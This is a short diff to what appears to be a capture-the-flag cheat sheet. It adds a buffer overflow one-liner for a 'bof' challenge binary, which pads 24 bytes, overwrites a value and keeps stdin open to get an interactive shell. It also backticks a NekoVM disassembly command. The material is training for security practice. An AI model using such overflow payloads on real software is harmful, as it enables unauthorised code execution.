@@ -508,6 +508,7 @@ Pwn
 * `bof`
 
 	* `for i in {20..28}; do echo $i; python -c "print 'A' * $i + '\xee\xba\xf3\xca'" | ./bof ; done`
+	* `(python -c "print 'A' * 24 + '\xee\xba\xf3\xca'"; cat) | ./bof`
 	
 Programming
 --------------------
@@ -537,4 +538,4 @@ Reverse engineering
 
 * `NekoVM bytecode`
 	
-	* nekoc -d [FILENAME].n 
+	* `nekoc -d [FILENAME].n`
